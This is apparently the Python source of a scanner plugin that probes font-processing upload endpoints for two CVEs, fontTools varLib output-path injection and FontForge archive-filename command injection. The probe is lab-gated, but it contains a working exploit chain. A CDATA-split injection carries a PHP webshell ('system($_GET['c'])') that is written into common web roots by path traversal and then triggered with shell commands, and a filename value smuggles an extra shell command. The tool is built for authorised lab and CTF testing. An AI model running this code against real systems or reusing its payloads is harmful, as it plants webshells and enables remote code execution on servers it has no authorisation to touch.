"""
web:file_upload_rce_probe — file-upload → RCE detector (font-processing CVE classes).

The upload→RCE class that off-the-shelf scanners miss: a file-processing upload endpoint
whose output PATH and output CONTENT are attacker-controlled, yielding an arbitrary file
write (and, where that path is a web-served + script-executing directory, remote code
execution). The probe CONFIRMS the primitive with a content-validated differential rather
than guessing from the mere existence of an upload form — which is what makes it complementary
to, not a duplicate of, the generic exposure/upload nuclei templates.

Primary target — fontTools varLib **CVE-2025-66034** (HTB VariaType, source TTP #2):
a `.designspace`'s `<variable-font filename="...">` is used as the build OUTPUT path and is
passed through `os.path.join()` UNSANITISED, so an absolute / `../`-traversal filename writes
the generated font anywhere the worker can write; the axis `<labelname>` CDATA is copied into
the output body verbatim (XML injection) — together an arbitrary-write→webshell primitive.

Detection is a build differential driven through the REAL varLib pipeline (the agent ships two
tiny FontBuilder masters so the target actually builds a variable font):
  1. CONTROL  — a valid build with a normal output filename must SUCCEED (download issued).
  2. PATHCTL  — the same build whose ONLY change is an attacker-controlled output directory
                (an absolute, non-writable path) must FAIL because the path is honoured.
  CONTROL succeeds AND PATHCTL fails ⇒ the filename is an unsanitised FS write path
  (a patched / sanitising generator returns success for both → no finding ⇒ FP-safe).
Then, lab-gated, an OPPORTUNISTIC step writes a benign marker webshell into candidate web
roots and triggers it; a content-validated echo upgrades the finding to confirmed RCE.

Also covers FontForge **CVE-2024-25082** — an uploaded archive/font FILENAME interpolated into
the build shell (`x;cmd;.zip`) → OS command injection (echo oracle).

Emits Nuclei-shaped findings so the backend reuses `processNucleiOutput` (ingestion signature
`FILE_UPLOAD_RCE`, path-aware, distinct template-id per CVE). Payloads are redacted; only the
benign marker proof (masked + sha256) is reported.

SAFETY: the build differential is read-mostly (it writes only a generated font to attacker
paths the worker can already reach), but the RCE upgrade drops a webshell + runs `echo
<marker>`, so the tool is a NO-OP unless armed with BOTH `aggressive=true` AND
`engagement="lab"` (CTF / authorised lab), mirroring `exploit:chain`. Best-effort cleanup
removes any dropped file after a confirmed hit.
"""

import base64
import hashlib
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlunparse, quote

import aiohttp

from plugin_interface import ToolPlugin


# Two pre-built fontTools FontBuilder masters (square `.notdef` + `A`), weight 100 / 400,
# embedded so the agent (which has no fontTools dependency) can drive a REAL varLib build on
# the target — the vuln only triggers once varLib actually generates the variable font.
_MASTER_LIGHT_B64 = (
    "AAEAAAAKAIAAAwAgT1MvMkAMQRUAAAEoAAAAYGNtYXAADACUAAABkAAAADRnbHlmIkRrqAAAAcwAAAAwaGVhZC3Y"
    "wOAAAACsAAAANmhoZWEFFgEvAAAA5AAAACRobXR4AyAAAAAAAYgAAAAIbG9jYQAYAAwAAAHEAAAABm1heHAABAAG"
    "AAABCAAAACBuYW1lxQj7VAAAAfwAAABXcG9zdAAoAAAAAAJUAAAAJgABAAAAAQAA6ifHHl8PPPUAAwPoAAAAAOZn"
    "PwYAAAAA5mc/BgAAAAAB9AH0AAAAAwACAAAAAAAAAAEAAAMg/zgAAAH0AAAAAAH0AAEAAAAAAAAAAAAAAAAAAAAC"
    "AAEAAAACAAQAAQAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAwGQAGQABQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAPz8/PwAAAEEAQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAB9AAA"
    "ASwAAAAAAAIAAAADAAAAFAADAAEAAAAUAAQAIAAAAAQABAABAAAAQf//AAAAQf///8AAAQAAAAAAAAAMABgAAAAB"
    "AAAAAAH0AfQAAwAAMSERIQH0/gwB9AABAAAAAAEsASwAAwAAMSERIQEs/tQBLAAAAAQANgABAAAAAAABAAcAAAAB"
    "AAAAAAACAAQABwADAAEECQABAA4ACwADAAEECQACAAgAGVB3bkZvbnRXMTAwAFAAdwBuAEYAbwBuAHQAVwAxADAA"
    "MAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAJAAA"
)
_MASTER_REGULAR_B64 = (
    "AAEAAAAKAIAAAwAgT1MvMkE4QXkAAAEoAAAAYGNtYXAADACUAAABkAAAADRnbHlmIkRuAAAAAcwAAAAwaGVhZC3Y"
    "wOAAAACsAAAANmhoZWEFFgEuAAAA5AAAACRobXR4AfQAAAAAAYgAAAAGbG9jYQAYAAwAAAHEAAAABm1heHAABAAG"
    "AAABCAAAACBuYW1lxQkBVAAAAfwAAABXcG9zdAAoAAAAAAJUAAAAJgABAAAAAQAA6ie1ql8PPPUAAwPoAAAAAOZn"
    "PwYAAAAA5mc/BgAAAAAB9AH0AAAAAwACAAAAAAAAAAEAAAMg/zgAAAH0AAAAAAH0AAEAAAAAAAAAAAAAAAAAAAAB"
    "AAEAAAACAAQAAQAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAwH0AZAABQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAPz8/PwAAAEEAQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAB9AAA"
    "AAAAAAAAAAIAAAADAAAAFAADAAEAAAAUAAQAIAAAAAQABAABAAAAQf//AAAAQf///8AAAQAAAAAAAAAMABgAAAAB"
    "AAAAAAH0AfQAAwAAMSERIQH0/gwB9AABAAAAAAH0AfQAAwAAMSERIQH0/gwB9AAAAAQANgABAAAAAAABAAcAAAAB"
    "AAAAAAACAAQABwADAAEECQABAA4ACwADAAEECQACAAgAGVB3bkZvbnRXNDAwAFAAdwBuAEYAbwBuAHQAVwA0ADAA"
    "MAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAJAAA"
)
MASTER_LIGHT = base64.b64decode(_MASTER_LIGHT_B64)
MASTER_REGULAR = base64.b64decode(_MASTER_REGULAR_B64)

# A structurally valid designspace varLib will actually BUILD from the two masters. {label}
# is the axis labelname (the XML/CDATA injection sink); {fn} is the <variable-font> output
# path (the arbitrary-write sink).
DESIGNSPACE_TMPL = (
    "<?xml version='1.0' encoding='UTF-8'?>\n"
    '<designspace format="5.0">\n'
    '  <axes><axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">\n'
    '    <labelname xml:lang="en">{label}</labelname></axis></axes>\n'
    "  <sources>\n"
    '    <source filename="source-light.ttf" name="Light"><location><dimension name="Weight" xvalue="100"/></location></source>\n'
    '    <source filename="source-regular.ttf" name="Regular"><location><dimension name="Weight" xvalue="400"/></location></source>\n'
    "  </sources>\n"
    '  <variable-fonts><variable-font name="VF" filename="{fn}"><axis-subsets><axis-subset name="Weight"/></axis-subsets></variable-font></variable-fonts>\n'
    "</designspace>"
)

# Candidate web roots the opportunistic RCE step writes a marker webshell into.
WEBROOT_CANDIDATES = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/app/public"]
# The generator returns a download link on a successful build; absence of it (or a redirect)
# on an otherwise-identical request whose only change is the output directory ⇒ path honoured.
DOWNLOAD_RE = re.compile(r"/download/[A-Za-z0-9_\-]{3,}")
HTML_MARKERS = ("<!doctype html", "<html", "<head", "<body", "<title", "<nav")
DEFAULT_UPLOAD_PATHS = [
    "/tools/variable-font-generator/process",
    "/tools/variable-font-generator",
    "/tools/upload",
    "/generate",
    "/upload",
    "/convert",
    "/process",
]
UPLOAD_LINK_HINTS = ("upload", "tool", "generate", "font", "designspace", "convert", "variable")
FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL)
ATTR = lambda n: re.compile(rf"""{n}\s*=\s*['"]?([^'"\s>]+)""", re.IGNORECASE)
ACTION_RE, ENCTYPE_RE, METHOD_RE = ATTR("action"), ATTR("enctype"), ATTR("method")
FILE_INPUT_RE = re.compile(r"<input\b[^>]*type\s*=\s*['\"]?file['\"]?[^>]*>", re.IGNORECASE)
NAME_RE, ACCEPT_RE = ATTR("name"), ATTR("accept")
HREF_RE = re.compile(r"href\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)


def _cdata_inject(payload: str) -> str:
    """CDATA-split so a literal `]]>` rides inside the labelname (the XML-injection trick)."""
    return f"<![CDATA[{payload}]]]]><![CDATA[>]]>"


class WebFileUploadRceProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:file_upload_rce_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms file-upload → arbitrary-file-write / RCE on font-processing endpoints via "
            "fontTools varLib designspace output-path injection (CVE-2025-66034) and FontForge "
            "zip/filename command injection (CVE-2024-25082). Drives a real varLib build and "
            "content-validates an unsanitised output-path differential (not form-presence guessing); "
            "lab-gated; Nuclei-shaped findings; payloads redacted."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Base URL of the web app to probe (e.g. http://variatype.htb/)."},
                "url": {"type": "string", "description": "Alias for target."},
                "uploadPaths": {"type": "array", "items": {"type": "string"}, "description": "Explicit upload page or multipart POST endpoint paths (skips discovery)."},
                "aggressive": {"type": "boolean", "default": False, "description": "Required (with engagement=lab) to ARM the intrusive upload→RCE probe."},
                "engagement": {"type": "string", "description": "Set to 'lab' to confirm an authorized lab/CTF target (required with aggressive)."},
                "webrootCandidates": {"type": "array", "items": {"type": "string"}, "description": "Web roots to attempt the marker-webshell RCE upgrade (default: common roots)."},
                "rceUpgrade": {"type": "boolean", "default": True, "description": "After confirming arbitrary write, attempt a benign marker-webshell RCE upgrade."},
                "cleanup": {"type": "boolean", "default": True, "description": "Best-effort delete of any dropped webshell after a confirmed RCE."},
                "maxRequests": {"type": "integer", "default": 60},
                "timeoutSeconds": {"type": "integer", "default": 30},
                "headers": {"type": "object"},
                "cookie": {"type": "string"},
            },
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "vuln-scan",
            "phase": 2,
            "domain": ["web"],
            "input_type": ["url"],
            "output_type": ["findings"],
            "chainable_after": ["httpx:", "katana:", "dirsearch:", "arjun:"],
            "chainable_before": ["decision:"],
        }

    async def execute(self, parameters: Dict[str, Any]) -> Any:
        raw_target = parameters.get("target") or parameters.get("url") or ""
        origin = self._origin(raw_target)
        if not origin:
            return {"success": False, "error": f"target must be an http(s) URL: {raw_target!r}"}

        aggressive = bool(parameters.get("aggressive"))
        engagement = str(parameters.get("engagement") or "").strip().lower()
        if not (aggressive and engagement == "lab"):
            return {
                "success": True,
                "skipped": True,
                "tool": self.name,
                "target": origin,
                "reason": "requires aggressive=true + engagement=lab (intrusive upload→RCE probe is disarmed)",
                "findings": [],
            }

        self._timeout_s = max(8, min(int(parameters.get("timeoutSeconds") or 30), 120))
        self._max_requests = max(6, min(int(parameters.get("maxRequests") or 60), 400))
        self._reqs = 0
        self._cleanup = bool(parameters.get("cleanup", True))
        self._rce_upgrade = bool(parameters.get("rceUpgrade", True))
        self._webroots = parameters.get("webrootCandidates") or WEBROOT_CANDIDATES
        explicit_paths = [str(p) for p in (parameters.get("uploadPaths") or []) if str(p).strip()]
        agent = parameters.get("_agent")

        headers = {"User-Agent": "xASM-file-upload-rce-probe/2.0", "Accept": "*/*"}
        extra = parameters.get("headers")
        if isinstance(extra, dict):
            headers.update({str(k): str(v) for k, v in extra.items()})
        if parameters.get("cookie"):
            headers["Cookie"] = str(parameters["cookie"])

        findings: List[Dict[str, Any]] = []
        connector = aiohttp.TCPConnector(ssl=False, limit=6)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self._timeout_s),
            headers=headers,
        ) as session:
            self._session = session
            forms = await self._discover_forms(origin, explicit_paths, agent)
            if not forms:
                return {"success": True, "tool": self.name, "target": origin, "uploadFormsFound": 0,
                        "findings": [], "summary": {"forms": 0, "findings": 0, "requests": self._reqs}}
            for i, form in enumerate(forms):
                if agent:
                    agent.report_progress("Probing upload form", form["action"], i + 1, len(forms))
                ft = await self._probe_fonttools(origin, form, agent)
                if ft:
                    findings.append(ft)
                ff = await self._probe_fontforge(origin, form)
                if ff:
                    findings.append(ff)
                if self._reqs >= self._max_requests:
                    break

        raw_lines = [f"[{f['info']['severity'].upper()}] {f['info']['name']} - {f['matched-at']}" for f in findings]
        return {
            "success": True,
            "tool": self.name,
            "target": origin,
            "uploadFormsFound": len(forms),
            "findings": findings,
            "total_findings": len(findings),
            "rawOutput": "\n".join(raw_lines),
            "summary": {"forms": len(forms), "findings": len(findings), "requests": self._reqs},
        }

    # ----- discovery -----
    async def _discover_forms(self, origin: str, explicit_paths: List[str], agent) -> List[Dict[str, Any]]:
        pages: List[str] = []
        seen: set = set()

        def add(u: str):
            if u and u not in seen:
                seen.add(u); pages.append(u)

        forms: List[Dict[str, Any]] = []
        for p in explicit_paths:
            full = p if p.startswith("http") else urljoin(origin + "/", p.lstrip("/"))
            add(full)
            if re.search(r"/process|/upload|/convert|/generate", full, re.IGNORECASE):
                forms.append({"pageUrl": full, "action": full, "method": "post",
                              "enctype": "multipart/form-data",
                              "fileFields": [{"name": "designspace", "accept": ".designspace"},
                                             {"name": "masters", "accept": ".ttf,.otf"}]})
        _, home = await self._get(origin + "/")
        for href in HREF_RE.findall(home.decode("utf-8", "replace")) if home else []:
            if any(h in href.lower() for h in UPLOAD_LINK_HINTS):
                add(urljoin(origin + "/", href))
        for cp in DEFAULT_UPLOAD_PATHS:
            add(urljoin(origin + "/", cp.lstrip("/")))

        for page in pages[:24]:
            if self._reqs >= self._max_requests:
                break
            status, body = await self._get(page)
            if status != 200 or not body:
                continue
            forms.extend(self._parse_forms(body.decode("utf-8", "replace"), page))

        uniq: Dict[str, Dict[str, Any]] = {}
        for f in forms:
            key = f["action"] + "|" + ",".join(sorted(ff["name"] for ff in f["fileFields"]))
            uniq.setdefault(key, f)
        return list(uniq.values())

    def _parse_forms(self, html: str, page_url: str) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        for m in FORM_RE.finditer(html):
            attrs, inner = m.group(1), m.group(2)
            enctype = (ENCTYPE_RE.search(attrs).group(1) if ENCTYPE_RE.search(attrs) else "").lower()
            file_inputs = FILE_INPUT_RE.findall(inner)
            if "multipart/form-data" not in enctype and not file_inputs:
                continue
            action_m = ACTION_RE.search(attrs)
            action = urljoin(page_url, action_m.group(1)) if action_m else page_url
            fields = []
            for inp in file_inputs:
                nm = NAME_RE.search(inp); acc = ACCEPT_RE.search(inp)
                if nm:
                    fields.append({"name": nm.group(1), "accept": acc.group(1) if acc else ""})
            if fields:
                out.append({"pageUrl": page_url, "action": action, "method": "post",
                            "enctype": enctype or "multipart/form-data", "fileFields": fields})
        return out

    def _pick_fields(self, form: Dict[str, Any]) -> Tuple[str, Optional[str]]:
        fields = form["fileFields"]
        ds = next((f["name"] for f in fields if "designspace" in (f["accept"] + f["name"]).lower()), None) \
            or next((f["name"] for f in fields if "font" not in (f["accept"]).lower() and "master" not in f["name"].lower()), None) \
            or fields[0]["name"]
        master = next((f["name"] for f in fields if f["name"] != ds), None) or "masters"
        return ds, master

    # ----- probe A: fontTools CVE-2025-66034 (designspace output-path arbitrary write → RCE) -----
    async def _probe_fonttools(self, origin: str, form: Dict[str, Any], agent) -> Optional[Dict[str, Any]]:
        ds_field, master_field = self._pick_fields(form)
        action = form["action"]
        nonce = hashlib.sha256(f"{origin}{action}".encode()).hexdigest()[:10]

        # 1. CONTROL — a normal build must succeed (proves a working varLib generator).
        ctrl_ok, _ = await self._build(action, ds_field, master_field, label="Weight", fn=f"vf_{nonce}.ttf")
        if not ctrl_ok:
            return None  # not a working font generator → no FP

        # 2. PATHCTL — only the output DIRECTORY changes to an attacker-controlled, non-writable
        #    absolute path. A sanitising/patched generator still succeeds (basename in out dir);
        #    a vulnerable one honours the path and fails to write there.
        pc_ok, pc_status = await self._build(action, ds_field, master_field, label="Weight",
                                             fn=f"/zz{nonce}nope/vf_{nonce}.ttf")
        if pc_ok:
            return None  # output path sanitised → not vulnerable

        # arbitrary-file-write CONFIRMED. 3. opportunistically upgrade to RCE.
        rce = await self._rce_upgrade_probe(origin, action, ds_field, master_field, nonce, agent) if self._rce_upgrade else None
        return self._finding(action, ds_field, nonce, rce, pc_status)

    async def _rce_upgrade_probe(self, origin, action, ds_field, master_field, nonce, agent) -> Optional[Dict[str, Any]]:
        shell = f"vf{nonce}.php"
        for webroot in self._webroots:
            if self._reqs >= self._max_requests - 2:
                break
            marker = hashlib.sha256(f"{nonce}{webroot}".encode()).hexdigest()[:16]
            label = _cdata_inject("<?php system($_GET['c']); ?>")
            built, _ = await self._build(action, ds_field, master_field, label=label, fn=f"{webroot}/{shell}")
            if not built:
                continue
            status, body = await self._get(f"{origin}/{shell}?c={quote('echo ' + marker)}")
            if self._validate_echo(status, body, marker):
                if self._cleanup:
                    await self._get(f"{origin}/{shell}?c={quote('rm -f ' + webroot + '/' + shell)}")
                return {"webroot": webroot, "shell": shell, "marker": marker}
        return None

    # ----- probe B: FontForge CVE-2024-25082 (archive filename command injection) -----
    async def _probe_fontforge(self, origin: str, form: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        ds_field, master_field = self._pick_fields(form)
        nonce = hashlib.sha256(f"{origin}{form['action']}ff".encode()).hexdigest()[:10]
        marker = hashlib.sha256(f"{nonce}ff".encode()).hexdigest()[:16]
        evil = f"x;echo {marker};.zip"
        status, body = await self._post(
            form["action"], ds_field,
            DESIGNSPACE_TMPL.format(label="Weight", fn="vf.ttf").encode(),
            "m.designspace", master_field, master_name=evil,
        )
        if status is not None and self._validate_echo(status, body, marker):
            return self._finding_ff(form["action"], marker)
        return None

    # ----- build + HTTP -----
    async def _build(self, action, ds_field, master_field, *, label, fn) -> Tuple[bool, Optional[int]]:
        """Upload a designspace (label,fn) + the two embedded masters; return (success, status).
        success == the generator issued a /download link (a real build to the requested path)."""
        xml = DESIGNSPACE_TMPL.format(label=label, fn=fn).encode("utf-8")
        status, body = await self._post(action, ds_field, xml, "malicious.designspace", master_field)
        if status is None:
            return False, None
        text = body.decode("utf-8", "replace")
        ok = status == 200 and bool(DOWNLOAD_RE.search(text))
        return ok, status

    async def _post(self, action, primary_field, primary_bytes, primary_name, master_field, master_name="source-regular.ttf"):
        if self._reqs >= self._max_requests:
            return None, b""
        self._reqs += 1
        try:
            form = aiohttp.FormData()
            ctype = "application/octet-stream" if primary_name.endswith(".designspace") else "font/ttf"
            form.add_field(primary_field, primary_bytes, filename=primary_name, content_type=ctype)
            mf = master_field or "masters"
            # varLib matches masters to <source filename> by name; the FontForge probe rides the
            # first master's filename as the injection vector.
            form.add_field(mf, MASTER_REGULAR, filename=master_name, content_type="font/ttf")
            form.add_field(mf, MASTER_LIGHT, filename="source-light.ttf", content_type="font/ttf")
            async with self._session.post(action, data=form, allow_redirects=False) as resp:
                return resp.status, await resp.content.read(262144)
        except Exception:
            return None, b""

    async def _get(self, url: str) -> Tuple[Optional[int], bytes]:
        if self._reqs >= self._max_requests:
            return None, b""
        self._reqs += 1
        try:
            async with self._session.get(url, allow_redirects=False) as resp:
                return resp.status, await resp.content.read(131072)
        except Exception:
            return None, b""

    def _validate_echo(self, status: Optional[int], body: bytes, marker: str) -> bool:
        if not body:
            return False
        text = body.decode("utf-8", "replace")
        if marker not in text:
            return False
        head = text[:512].lstrip().lower()
        return not any(mk in head for mk in HTML_MARKERS)

    # ----- findings (Nuclei-shaped) -----
    def _finding(self, action: str, ds_field: str, nonce: str, rce: Optional[Dict[str, Any]], pc_status) -> Dict[str, Any]:
        if rce:
            name = "File Upload to RCE via fontTools varLib designspace output-path injection (CVE-2025-66034)"
            matched_at = f"{action.split('?')[0].rsplit('/', 1)[0]}/{rce['shell']}"
            extra = [
                f"rce:confirmed via marker echo at {rce['webroot']}/{rce['shell']}",
                f"marker:{self._mask(rce['marker'])}",
                f"markerSha256:{hashlib.sha256(rce['marker'].encode()).hexdigest()}",
                "proof:echoed",
            ]
            desc = (
                "A font-generation upload endpoint processes a user-supplied .designspace through "
                "fontTools varLib; the <variable-font filename> output path is unsanitised (CVE-2025-66034), "
                f"so a webshell was written under a web root and CONFIRMED executing `echo <marker>` "
                f"(field '{ds_field}' at {action})."
            )
        else:
            name = "File Upload to Arbitrary File Write via fontTools varLib designspace output-path injection (CVE-2025-66034)"
            matched_at = action
            extra = [
                "writePrimitive:confirmed (control build issued a download; an identical build whose only "
                f"change was an attacker-controlled output directory was honoured and failed, status={pc_status})",
                "rce:not confirmed here (output dir is not a web-served + script-executing directory)",
                "proof:output-path-differential",
            ]
            desc = (
                "A font-generation upload endpoint passes the .designspace <variable-font filename> to the "
                "build OUTPUT path without sanitisation (fontTools varLib CVE-2025-66034). A control build with "
                "a normal filename succeeded (download issued); an identical build whose only change was an "
                "attacker-controlled, non-writable output directory failed because the path was honoured — "
                "confirming arbitrary file write (remote code execution wherever the output directory is web-served "
                f"and script-executing). Field '{ds_field}' at {action}."
            )
        return self._envelope(
            template_id="xasm-file-upload-rce-fonttools-cve-2025-66034",
            name=name, severity="critical", cve="CVE-2025-66034", matched_at=matched_at,
            matcher_name="fonttools-designspace-output-path-injection",
            description=desc,
            remediation=("Upgrade fontTools to >= 4.60.2; never derive build output paths from attacker-controlled "
                         "designspace attributes; sanitise/normalise filenames and write generated artifacts to a "
                         "non-web-served, non-executable directory."),
            extracted=[f"endpoint:{action}", "cve:CVE-2025-66034", f"uploadField:{ds_field}"] + extra,
            tags=["file-upload", "rce", "arbitrary-file-write", "fonttools"],
        )

    def _finding_ff(self, action: str, marker: str) -> Dict[str, Any]:
        return self._envelope(
            template_id="xasm-file-upload-rce-fontforge-cve-2024-25082",
            name="File Upload to RCE via Archive Filename Command Injection (CVE-2024-25082)",
            severity="critical", cve="CVE-2024-25082", matched_at=action,
            matcher_name="fontforge-zipname-cmd-injection",
            description=("A file-processing upload endpoint interpolates an uploaded archive/font FILENAME into a shell "
                         "command (FontForge ZIP handling), allowing OS command injection. Confirmed by uploading a file "
                         "named `x;echo <marker>;.zip` and observing the marker echo in the response."),
            remediation=("Upgrade FontForge to a patched release; never pass user-controlled filenames to a shell; use "
                         "exec-style argument arrays and validate/normalise upload filenames."),
            extracted=[f"endpoint:{action}", "cve:CVE-2024-25082", "filename:x;echo <marker>;.zip (redacted)",
                       f"marker:{self._mask(marker)}", f"markerSha256:{hashlib.sha256(marker.encode()).hexdigest()}", "proof:echoed"],
            tags=["file-upload", "rce", "command-injection", "fontforge"],
        )

    def _envelope(self, *, template_id, name, severity, cve, matched_at, matcher_name, description, remediation, extracted, tags) -> Dict[str, Any]:
        return {
            "template-id": template_id, "templateID": template_id,
            "matched-at": matched_at, "matched": matched_at, "host": matched_at,
            "matcher-name": matcher_name, "extracted-results": [e for e in extracted if e],
            "info": {"name": name, "severity": severity, "description": description,
                     "remediation": remediation, "tags": tags, "classification": {"cve-id": cve}},
        }

    def _mask(self, value: str) -> str:
        if len(value) <= 4:
            return "*" * len(value)
        return f"{value[:2]}{'*' * (min(len(value), 12) - 4)}{value[-2:]} (len={len(value)})"

    def _origin(self, raw: str) -> Optional[str]:
        raw = str(raw or "").strip()
        if not raw:
            return None
        if "://" not in raw:
            raw = "http://" + raw
        p = urlparse(raw)
        if p.scheme not in {"http", "https"} or not p.netloc:
            return None
        return urlunparse((p.scheme, p.netloc, "", "", "", ""))


def get_tool():
    return WebFileUploadRceProbeTool()
